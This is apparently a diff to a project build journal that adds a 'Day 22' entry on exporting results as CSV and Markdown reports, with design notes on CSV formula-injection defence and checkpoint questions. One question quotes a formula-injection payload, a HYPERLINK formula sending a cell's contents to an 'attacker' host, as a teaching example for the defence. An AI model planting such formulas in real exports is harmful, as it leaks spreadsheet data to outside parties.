@@ -47,6 +47,7 @@ authorization later is a common source of data leaks).
 | 19 | Gemini provider | Complete | 2026-11-16 commits (see Day 19) |
 | 20 | Dark mode | Complete | 2026-11-16 commits (see Day 20) |
 | 21 | Live Gemini run and overload fallback | Complete | 2026-11-19 commits (see Day 21) |
+| 22 | Exporting results | Complete | 2026-11-19 commits (see Day 22) |
 
 ---
 
@@ -349,6 +350,28 @@ authorization later is a common source of data leaks).
   1. Why is retrying sometimes worse than failing fast?
   2. Why does the fallback stay on for the rest of the run instead of switching back?
   3. Why did a run with stop reason `deadline` still score `completed = 1`, and is that right?
+
+## Day 22 — Exporting results
+
+- **Objective:** let users take results out of the app: each computed result as CSV and each
+  analysis as a report.
+- **Learn:** RFC 4180 CSV quoting and the UTF-8 BOM for Excel (Working, 20 min); CSV/formula
+  injection (Deep, 30 min); Blob and object URLs for client-side downloads (Working, 20 min).
+- **Built:** `src/lib/analyses/export.ts` (CSV, Markdown report, safe file names, download), a
+  CSV button on every result table and a Report button on finished analyses, unit and
+  component tests, and download checks in the Playwright test.
+- **Design notes:** exports run in the browser from the run already loaded (results are capped
+  at `MAX_RESULT_ROWS`), so no new endpoint or authorization path exists. Text cells starting
+  with `= + - @`, tab or CR get a leading apostrophe so a spreadsheet shows them as text instead
+  of running them; real numbers are untouched.
+- **Found while building it:** a test that replaced the global `URL` object also removed the
+  `URL` constructor that `fetch` needs, so the run never loaded; the tests now stub only
+  `createObjectURL` / `revokeObjectURL`.
+- **Checkpoint questions:**
+  1. What can `=HYPERLINK("http://attacker/?"&A1, "Click")` in an exported cell do, and why does
+     the apostrophe stop it?
+  2. Why is an export endpoint on the server riskier than building the file in the browser here?
+  3. Why does the CSV start with a byte order mark?
 
 ## Outstanding (needs you)
 
